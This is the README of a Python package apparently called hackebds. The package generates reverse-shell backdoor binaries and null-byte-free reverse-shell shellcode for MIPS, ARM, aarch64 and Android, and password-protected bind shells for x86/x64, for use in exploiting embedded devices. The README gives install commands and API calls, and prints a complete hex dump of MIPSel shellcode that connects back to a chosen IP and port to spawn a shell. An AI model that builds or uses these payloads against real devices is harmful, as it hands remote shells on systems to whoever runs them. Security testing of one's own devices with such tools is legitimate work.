# introduction

## foreword

>In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**

## fuction

This tool is embedded in the security test of the device. There are two main functions:

1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal in size.**Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**

2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**

3.  Fixed some bugs that the reverse_shellcode and reverse_backdoor **ports were selected too big**, and **added the function of generating bindshell with specified ports and passwords under x86 and x64**，**and beautified the generation process****（This feature will be updated to various architectures）**

## install (1)  Highly recommended！！Because the source code compilation may not be updated in time，Please install the latest

**pip install hackebds==0.1.5**

**pip3 install -U hackebds**

```
pip install hackebds==0.1.5
```

#### Instructions for use

When importing this module will import the pwn module

Please install the corresponding binutils environment before use
expample:
```
apt search binutils | grep arm（You can replace it here）
apt install binutils-arm-linux-gnueabi/hirsute
```
1. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell

```
>>> from hackebds import *
>>> mipsel_backdoor(reverse_ip,reverse_port)
>>> mips_backdoor(reverse_ip,reverse_port)
>>> aarch64_backdoor(reverse_ip,reverse_port)
>>> armelv5_backdoor(reverse_ip,reverse_port)
>>> armelv7_backdoor(reverse_ip,reverse_port)
>>> armebv5_backdoor(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_backdoor(reverse_ip,reverse_port)
>>> mips64el_backdoor(reverse_ip,reverse_port)
>>> x86_bind_shell(listen_port, passwd)
>>> x64_bind_shell(listen_port, passwd)
```

（Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
```
>>> mipsel_backdoor("127.0.0.1",5566)
[+] reverse_ip is: 127.0.0.1
[+] reverse_port is: 5566
[*] waiting 3s
[+] mipsel_backdoor is ok in current path ./
>>>
```

![image-20221026181947194](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20221026181947194.png)

```
>>> from hackebds import *
>>> x64_bind_shell(13000,"1235")
[+] bind port is set to 13000
[+] passwd is set to '1235'
[*] waiting 3s
[+] x64_bind_shell is ok in current path ./
```

![image-20221026182024685](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20221026182024685.png)

2. Generates the use-back shellcode (no free) null bytes corresponding to various architectures

```
>>> from hackebds import *
>>> mipsel_reverse_sl(reverse_ip,reverse_port)
>>> mips_reverse_sl(reverse_ip,reverse_port)
>>> aarch64_reverse_sl(reverse_ip,reverse_port)
>>> armelv5_reverse_sl(reverse_ip,reverse_port)
>>> armelv7_reverse_sl(reverse_ip,reverse_port)
>>> armebv5_reverse_sl(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_reverse_sl(reverse_ip,reverse_port)
>>> mips64el_reverse_sl(reverse_ip,reverse_port)
>>> android_aarch64_backdoor(reverse_ip,reverse_port)
```

example:

```
>>> from hackebds import *
>>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
[+] No NULL byte shellcode for hex(len is 264):
\xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
```

## chips and architectures

Tests can leverage chips and architectures

Mips:
MIPS 74kc V4.12 big endian
MIPS 24kc V5.0  little endian

Armv7:
Allwinner(全志)V3s

Armv8:
Qualcomm Snapdragon 660

## updating

 2022.4.19 Added support for aarch64 null-byte reverse_shellcode

 2022.4.30 Reduced amount of code using functions and support python3

 2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and mipsel_reverse_sl were not enabled, added mips64_backdoor, mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl generation

 2022.5.21 0.0.9 version changed the generation method of armel V5 backdoor and added the specified generation of riscv-v64 backdoor

 2022.6.27 0.1.0 Added Android backdoor generation

 2022.10.26 0.1.5 Fixed some problems and added some automatic generation functions of bindshell specified port passwords
 

## One-click build environment

To be added
